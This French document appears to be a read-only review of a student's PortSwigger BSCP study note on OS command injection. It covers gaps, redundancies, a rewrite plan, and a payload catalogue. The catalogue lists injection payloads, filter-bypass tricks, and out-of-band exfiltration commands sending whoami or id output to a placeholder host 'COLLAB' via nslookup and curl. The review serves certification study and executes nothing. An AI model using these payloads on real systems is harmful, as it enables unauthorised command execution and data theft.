# Revue documentaire de la note 01-Server-side/Command-injection.md

Date : 2026-11-06. Type : revue de lecture uniquement. Aucune requête envoyée, aucun payload rejoué, la note et la fiche de payloads n'ont pas été modifiées.
Source relue : /home/capss/web-bscp/BSCP-Vault/01-Server-side/Command-injection.md (121 lignes), et la section "Command injection" de /home/capss/web-bscp/BSCP-Vault/04-Essential-skills/Payloads-cheatsheet.md (lignes 108 à 115) pour éviter les doublons.

## 0. État des labs, d'après le contenu de la note

| Lab | Niveau | État | Indice dans la note |
| --- | --- | --- | --- |
| OS command injection, simple case | Apprentice | Réalisé | case cochée avec date 2026-10-19 (ligne 93) ; journal rédigé avec étapes (lignes 97 à 105) |
| Blind OS command injection with time delays | Practitioner | Non réalisé | listé sous "non traités" (ligne 108) |
| Blind OS command injection with output redirection | Practitioner | Non réalisé | ligne 109 |
| Blind OS command injection with out-of-band interaction | Practitioner | Non réalisé | ligne 110 |
| Blind OS command injection with out-of-band data exfiltration | Practitioner | Non réalisé | ligne 111 |

Recommandation pour les quatre labs non réalisés : laisser la note dans son état actuel sur ce point. Pas de journal, pas de solution, pas de déroulé ajoutés par cette revue. L'utilisateur les complétera lui-même après les avoir faits.
Le seul payload de la note confirmé par un lab réalisé est `1|whoami` dans `storeID` (ligne 104). Tout le reste est à vérifier au sens du point 3.

## 1. Ce qui manque ou est flou

### Concepts
- Pas de distinction entre injection de commande (le shell interprète des métacaractères) et injection d'arguments ou d'options (l'entrée reste un argument mais commence par `-` ou change le comportement du programme appelé). Utile pour comprendre pourquoi la prévention par liste d'arguments sans shell supprime le premier cas mais pas le second.
- Le rôle du shell n'est pas expliqué : les séparateurs ne fonctionnent que si la commande passe par un interpréteur (`sh -c`, `cmd /c`). Une exécution directe sans shell (appel de type `execve` avec liste d'arguments) neutralise les séparateurs.
- Contexte d'injection : la note évoque les guillemets (ligne 49) mais ne distingue pas les cas : hors guillemets, entre guillemets doubles (la substitution `$(...)` reste active), entre guillemets simples (aucune substitution, il faut fermer le guillemet), à l'intérieur d'un argument d'une autre commande (`echo`, `grep`).
- Le tableau des types (lignes 26 à 29) n'a que deux lignes alors que le texte en traite quatre sous-variantes aveugles (délai, redirection, interaction réseau, exfiltration). Découper le tableau pour qu'il corresponde aux sections suivantes.

### Méthodologie de détection
- Pas de notion de référence de temps (mesurer plusieurs fois le temps de réponse normal avant d'interpréter un délai) ni de test de contrôle (même requête avec un délai différent, 5 puis 10 secondes, pour vérifier que le temps suit la valeur).
- Pas d'ordre de test recommandé. Proposition : sortie visible, puis délai, puis interaction réseau, puis redirection de la sortie.
- Pas de grille de lecture des faux positifs : un délai peut venir d'un autre traitement, un filtre d'application peut renvoyer une erreur générique, une requête DNS reçue peut venir d'un composant intermédiaire (résolveur, pare-feu applicatif) et non de la commande.
- Le jeu de points d'injection à tester est partiel (ligne 84) : ajouter les noms de fichiers téléversés, les champs JSON et XML, les paramètres de chemin d'URL.
- Pas de rappel que l'exécution peut être asynchrone (traitement en file d'attente, tâche planifiée) : la preuve arrive plus tard, ce qui compte pour la détection par délai.

### Variantes et systèmes d'exploitation
- Détection par délai : seulement `ping` (lignes 35 et 74). Manque `sleep` côté Unix, `timeout` ou `ping -n` côté Windows, `Start-Sleep` si PowerShell. Rappeler que `ping -c` est propre à Linux (sur macOS aussi, mais pas sous Windows qui utilise `-n`), et que `127.0.0.1` évite toute sortie réseau.
- Côté Windows, presque rien : pas de variable d'environnement (`%USERNAME%`), pas de caractère d'échappement (`^`), pas de différence entre `cmd` et PowerShell, pas de `type` ou `dir` pour lire des fichiers. Le tableau "Séparateurs" donne `;` et saut de ligne "non" pour Windows, ce qui est vrai pour `cmd`, mais faux pour PowerShell où `;` est un séparateur. À préciser.
- Pas de commande de lecture de fichier dans le tableau des commandes utiles (`cat` / `type`, `id`, `hostname`, `pwd` / `cd`, `dir` / `ls`).
- Hors bande : seul DNS via `nslookup` est cité. Manque HTTP (`curl`, `wget`), la variante Windows de l'exfiltration (la substitution par guillemets inversés n'existe pas sous `cmd`, il faut une variable d'environnement ou une boucle `for /f`), et la limite des 63 caractères par étiquette DNS.
- Redirection de la sortie : la note donne un chemin précis (`/var/www/static`, ligne 75) sans expliquer comment trouver un répertoire servi et inscriptible (chemin racine du serveur web, répertoire des images ou des fichiers statiques observé dans le trafic, messages d'erreur). Dire aussi que le fichier créé reste en place et qu'il faut choisir un nom neutre et le supprimer si c'est possible dans le périmètre.
- Pas de mention de `2>&1` pour capturer aussi la sortie d'erreur.

### Limites
- Burp Collaborator nécessite Burp Suite Professional. Mentionner une alternative (serveur d'interaction public ou auto-hébergé) pour les contextes hors labs, et noter que le filtrage des connexions sortantes bloque souvent HTTP mais laisse passer DNS.
- Longueur et jeu de caractères des données exfiltrées par DNS : étiquettes de 63 caractères au plus, caractères limités ; une valeur avec espace ou symbole casse la requête.
- Limite de longueur d'une entrée, liste noire de mots (`whoami`, `cat`), pare-feu applicatif : non traités.
- Les commandes qui bloquent (délai long) peuvent saturer des travailleurs : garder des délais courts en environnement réel.

### Contre-mesures
- Bien, mais ajouter : l'échappement fourni par le langage (`escapeshellarg` en PHP, `shlex.quote` en Python) ne protège pas contre l'injection d'options ; préférer `--` pour terminer les options ; filtrage des connexions sortantes comme défense en profondeur ; bac à sable ou conteneur sans outils inutiles ; journalisation des appels de processus.
- Citer les API sans shell (`subprocess` avec liste d'arguments sans `shell=True`, `ProcessBuilder`, `execFile`) comme exemples concrets.

### Pièges BSCP
- La note les mentionne (lignes 79 à 84) mais en mélange le contenu avec des généralités. Pièges à ajouter : encodage des espaces et du `+` dans les corps de type formulaire, double encodage selon le point d'entrée, `&` non encodé qui coupe un paramètre GET, utilisation du second séparateur pour isoler la suite, durée d'une requête qui dépasse le délai de Burp, résultat Collaborator à relever avec "Poll now" après un court délai, vérifier la réponse Repeater pour la redirection de sortie avant de conclure à un échec.
- Dans le contexte d'un examen chronométré : savoir quelle étape suit la découverte (lecture d'un fichier cible donné par l'énoncé), sans en détailler la solution ici.

## 2. Ce qui est superflu, redondant ou hors sujet

- Ligne 114 : section "Mes notes" avec une puce vide. Soit la remplir, soit retirer la puce.
- Ligne 22 : la phrase se termine par "le système, le réseau..." (points de suspension de brouillon).
- Lignes 9 à 11 et 57 à 67 : texte proche d'une traduction de la page Web Security Academy (exemple `stockreport.pl 381 29`, chaîne `aiwefwlguh`). Reformuler avec ses propres mots et ne garder que ce qui sert à la mémorisation.
- Lignes 100 et 101 : énoncé du lab recopié. Remplacer par un résumé d'une ligne.
- Ligne 93 : emoji dans la case cochée ; incohérent avec le style sobre des autres notes (à vérifier par comparaison avec les autres notes du dépôt).
- Redondances : le tableau de séparateurs est répété en partie dans la cheat sheet (ligne 114) ; la détection (lignes 31 à 37) et "Injection aveugle" (lignes 72 à 77) donnent deux fois les mêmes exemples (`ping`, `nslookup`) ; la ligne 82 et la ligne 66 à 67 expliquent deux fois "commande introuvable".
- Ligne 70 et 57 : le conseil du second `&` est donné deux fois (ligne 70 et dans la cheat sheet).
- Liens hors sujet (lignes 117 à 120) : [[SSRF]] est un lien plausible (l'exfiltration hors bande est voisine) mais le lien devrait être justifié ; [[Path-traversal]] et [[Information-disclosure]] n'ont pas de rapport direct ; [[File-upload-web-shell]] est pertinent seulement comme suite d'impact (exécution de code), à nommer comme tel. Seul [[Payloads-cheatsheet]] est clairement utile.
- Ligne 7 du front matter : `niveau: practitioner` alors que la note a un lab Apprentice terminé et une expertise partielle ; `statut: en cours` est cohérent.
- Ligne 83 : "passer à la détection par délai" est une répétition de la logique des lignes 35 et 72.
- Formulation à corriger : ligne 82, "montre que l'injection fonctionne" est trop affirmatif ; cela montre que la commande d'origine continue d'être exécutée après le point d'injection, pas qu'une commande injectée s'est exécutée.
- Terme anglais mixé : "out-of-band" et "blind" sont donnés avec italique une fois, puis en roman ; unifier.

## 3. Catalogue de payloads

Légende. "Rejoué" signifie rejoué par l'utilisateur dans un lab réalisé. Tout le reste est marqué "à vérifier". `COLLAB` désigne un sous-domaine d'interaction que l'on contrôle. Les exemples sont génériques et ne sont pas liés à un lab non réalisé.
Précaution commune : encoder dans l'URL les caractères spéciaux (`&` en `%26`, `;` en `%3b`, saut de ligne en `%0a`, espace en `+` ou `%20`, `|` en `%7c`).

### 3.1 Sortie visible

| OS | Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- | --- |
| Unix et Windows | `1\|whoami` | valeur hors guillemets, sortie renvoyée dans la réponse | le nom du compte apparaît dans la réponse | dépend du fait que la sortie soit réellement affichée | Rejoué (lab simple, ligne 104 de la note) |
| Unix et Windows | `& echo MARQUEUR &` | test neutre, plus sûr qu'une commande système | `MARQUEUR` dans la réponse ; souvent aussi des erreurs de la commande d'origine | un filtre peut retirer la sortie ; marqueur à choisir unique | À vérifier |
| Unix et Windows | `\|whoami` | quand le paramètre d'origine doit être consommé | résultat de `whoami` | le `\|` passe la sortie de la première commande à la seconde ; la première doit pouvoir s'exécuter | À vérifier |
| Unix | `; id` | séparateur Unix | `uid=...` | `;` parfois filtré | À vérifier |
| Unix | `$(id)` ou `` `id` `` | substitution ; fonctionne même entre guillemets doubles | `uid=...` | ne fonctionne pas entre guillemets simples | À vérifier |
| Unix | `'; id; '` ou `"; id; "` | fermeture d'un guillemet simple ou double, puis réouverture pour équilibrer | `uid=...` | il faut deviner le type de guillemet ; une erreur de syntaxe du shell révèle le contexte | À vérifier |
| Windows | `& ver &` | enchaînement `cmd` | version du système | `ver` est interne à `cmd` | À vérifier |
| Windows | `& echo %USERNAME% &` | variable d'environnement | nom du compte courant | valeur de la variable pas toujours celle de `whoami` pour un service | À vérifier |

### 3.2 Aveugle par délai

| OS | Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- | --- |
| Unix | `& sleep 10 &` | commande la plus directe | réponse environ 10 secondes plus lente que la référence | dépend d'une commande `sleep` disponible ; doit être comparé à une référence | À vérifier |
| Unix | `& ping -c 10 127.0.0.1 &` | quand `sleep` est filtré | environ 10 secondes (une par paquet) | `-c` propre à Unix ; délai dépend de l'intervalle d'une seconde | À vérifier (cité dans la note, non rejoué) |
| Windows | `& ping -n 10 127.0.0.1 &` | `ping` Windows | environ 9 à 10 secondes | `-n` correspond au nombre de requêtes ; la première est immédiate | À vérifier (cité dans la note, non rejoué) |
| Windows | `& timeout /t 10 &` | alternative | environ 10 secondes | `timeout` refuse parfois une entrée redirigée sans console | À vérifier |
| Windows (PowerShell) | `; Start-Sleep 10;` | si l'application appelle PowerShell | environ 10 secondes | seulement si PowerShell est l'interpréteur | À vérifier |
| Unix et Windows | variante avec `\|\|`, `&&` | choisir le séparateur selon le code de retour de la commande d'origine | délai présent seulement avec le bon séparateur | permet aussi de tester de façon conditionnelle | À vérifier |

Contrôle : refaire avec 5 puis 10 secondes ; le temps doit suivre. Mesurer la référence plusieurs fois.

### 3.3 Aveugle par redirection de sortie

| OS | Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- | --- |
| Unix | `& whoami > /chemin/web/inscriptible/fichier.txt &` puis `GET /fichier.txt` | répertoire servi et inscriptible connu | contenu de la sortie dans la réponse du `GET` | chemin à découvrir ; droits d'écriture ; le serveur peut ne pas servir ce répertoire | À vérifier (cité dans la note, non rejoué) |
| Unix | `& id > /chemin/fichier 2>&1 &` | capturer aussi la sortie d'erreur | texte d'erreur éventuellement lisible | idem | À vérifier |
| Windows | `& whoami > C:\chemin\web\fichier.txt &` | racine web Windows | lecture du fichier par `GET` | chemins différents (par exemple sous `inetpub`) ; droits | À vérifier |

Nettoyer le fichier créé quand c'est possible et autorisé.

### 3.4 Hors bande (interaction réseau et exfiltration)

| OS | Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- | --- |
| Unix et Windows | `& nslookup COLLAB &` | prouver l'exécution sans sortie | requête DNS reçue côté serveur d'interaction | égress DNS nécessaire ; `nslookup` peut manquer sur des images Unix minimales | À vérifier (cité, non rejoué) |
| Unix | ``& nslookup `whoami`.COLLAB &`` | exfiltrer une courte valeur dans le sous-domaine | la valeur apparaît comme sous-domaine dans la requête reçue | valeur de 63 caractères au plus, sans espace ni symbole | À vérifier (cité, non rejoué) |
| Unix | `& nslookup $(whoami).COLLAB &` | même chose avec `$(...)` | idem | idem | À vérifier |
| Windows | `& nslookup %USERNAME%.COLLAB &` | exfiltration d'une variable d'environnement (les guillemets inversés n'existent pas sous `cmd`) | nom dans la requête | limité aux variables ; pour une commande, il faut une boucle `for /f` | À vérifier |
| Unix | `& curl http://COLLAB/ &` ou `& wget http://COLLAB/ &` | interaction HTTP | requête HTTP reçue | HTTP sortant souvent bloqué ; outil absent possible | À vérifier |
| Unix | ``& curl http://COLLAB/`id|base64 -w0` &`` | exfiltration plus longue par HTTP | valeur codée dans le chemin | encodage nécessaire pour les caractères spéciaux ; à ne pas faire en grande quantité | À vérifier |

### 3.5 Séparateurs et contournements de filtre

| OS | Technique | Exemple | Contexte | Limites | État |
| --- | --- | --- | --- | --- | --- |
| Unix et Windows | séparateurs de la note | `&`, `&&`, `\|`, `\|\|` | tester tous | sémantique différente selon le code de retour | À vérifier (seul `\|` rejoué) |
| Unix | point-virgule et saut de ligne | `;`, `%0a` | séparateurs propres à Unix | souvent filtrés | À vérifier |
| Unix | retour chariot | `%0d%0a` ou `%0a` | quand la frappe saute une ligne | selon l'interpréteur | À vérifier |
| Unix | espace filtré | `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, tabulation `%09` | filtre sur l'espace | `{...}` dépend de Bash ; `$IFS` dépend du shell | À vérifier |
| Unix | mot filtré | `w'h'oami`, `w"h"oami`, `who\ami` | liste noire de commandes | fonctionne si le filtre est naïf | À vérifier |
| Unix | caractères construits | `${PATH:0:1}` pour `/` | `/` filtré | Bash | À vérifier |
| Windows | caractère d'échappement | `who^ami` | liste noire de commandes `cmd` | `cmd` seulement | À vérifier |
| Windows | variable découpée | `%PROGRAMFILES:~10,1%` pour une espace | filtre sur l'espace | dépend de la variable ; fragile | À vérifier |
| Unix et Windows | encodage d'URL ou double encodage | `%26`, `%252f` | filtre appliqué avant le décodage | selon la chaîne de traitement | À vérifier |
| Unix et Windows | position d'injection autre | en-têtes, cookies, nom de fichier | entrée non filtrée | dépend de l'application | À vérifier |

## 4. À reporter dans la cheat sheet

La cheat sheet contient déjà (lignes 108 à 115) : `1|whoami`, `& echo aiwefwlguh &`, `& ping -c 10 127.0.0.1 &`, redirection vers un répertoire web, `nslookup` avec `whoami`, liste de séparateurs. Ci-dessous, seulement ce qui s'y ajoute. Ces lignes sont à marquer "non rejoué" tant qu'elles n'ont pas été éprouvées en lab. Format conforme au style de la fiche (tirets normaux, pas de flèches).

- `& sleep 10 &` - délai Unix ; comparer avec le temps de référence
- `& ping -n 10 127.0.0.1 &` - délai Windows (rappel de l'option `-n`)
- `& timeout /t 10 &` - délai Windows, alternative
- `& nslookup COLLAB &` - interaction sans exfiltration (preuve d'exécution seule)
- `& nslookup $(whoami).COLLAB &` - exfiltration Unix avec `$(...)`
- `& nslookup %USERNAME%.COLLAB &` - exfiltration Windows (variable d'environnement)
- `& curl http://COLLAB/ &` - interaction HTTP Unix
- `$(id)` et `` `id` `` - substitution, valable entre guillemets doubles seulement
- `'; id; '` et `"; id; "` - fermer un guillemet puis le rouvrir pour équilibrer la commande
- `${IFS}` ou tabulation `%09` - remplacement de l'espace filtré (Unix)
- `w'h'oami` - mot filtré (Unix) ; `who^ami` (Windows cmd)
- `2>&1` après une redirection - capturer aussi les erreurs
- Rappel d'encodage : `&` `%26`, `;` `%3b`, `|` `%7c`, saut de ligne `%0a`, espace `+` ou `%20`
- Contrôle d'un délai : refaire avec 5 puis 10 secondes, comparer avec une référence mesurée plusieurs fois

Correction à signaler pour la ligne 114 de la fiche : dire que `;` et le saut de ligne sont "Unix seulement" est vrai pour `cmd` mais pas pour PowerShell (pour `;`).

## 5. Plan de réécriture de la note

Principe : ne pas toucher à la section des labs non réalisés (lignes 107 à 111) ni à la case Practitioner. Le journal du lab 1 reste, avec un résumé reformulé.

1. Front matter : conserver `statut: en cours` ; réviser `niveau` si nécessaire.
2. En bref (réduit à 4 puces) : définition, cause, impact, condition (un shell est appelé).
3. Comprendre : shell et métacaractères, injection de commande contre injection d'arguments, contextes de guillemets (hors guillemets, doubles, simples, argument d'une autre commande).
4. Séparateurs : un seul tableau, avec colonnes Unix, `cmd`, PowerShell, comportement selon le code de retour. Y inclure la substitution `$(...)` et les guillemets inversés.
5. Détection : ordre de test recommandé, référence de temps, test de contrôle, faux positifs. Points d'injection à couvrir (paramètres, corps, en-têtes, cookies, nom de fichier, chemin).
6. Variantes : un tableau à cinq lignes (sortie visible, délai, redirection, interaction réseau, exfiltration), chacune avec idée, signal, prérequis, limites. Renvoyer vers le catalogue de la cheat sheet plutôt que de répéter les exemples.
7. Spécificités par système : tableau des commandes utiles complété (lecture de fichier, identité, répertoire courant) pour Unix et Windows ; variables d'environnement Windows.
8. Contournements de filtre : espace, mots, caractères, encodage ; marquer ce qui est non rejoué.
9. Pièges BSCP : fusionner lignes 79 à 84 avec les ajouts de la section 1 ci-dessus, sans doublon.
10. Prévention : conserver, ajouter l'injection d'options, `--`, filtrage sortant, bac à sable, API sans shell.
11. Labs : conserver la case Apprentice et le journal du lab 1 (reformuler l'énoncé en une ligne) ; ne pas modifier la liste des quatre labs non traités.
12. Mes notes : remplir avec des observations personnelles de l'utilisateur après ses labs, ou supprimer la puce vide.
13. Liens : garder [[Payloads-cheatsheet]], ajouter [[File-upload-web-shell]] avec la raison, justifier ou retirer [[SSRF]], retirer [[Path-traversal]] et [[Information-disclosure]] s'ils n'ont pas de lien explicite.
14. Après chaque lab Practitioner réalisé par l'utilisateur : basculer l'état "à vérifier" des lignes correspondantes en "rejoué" et reporter le payload dans la fiche.

## Réserves
- Revue documentaire seulement : aucun payload de ce document n'a été exécuté. Seul `1|whoami` est attesté, par le journal du lab 1 écrit par l'utilisateur.
- Non vérifié : l'existence des notes liées dans le dépôt (les liens ne sont pas résolus), le style d'autres notes (emoji de la ligne 93), le comportement exact de chaque commande sur chaque système.
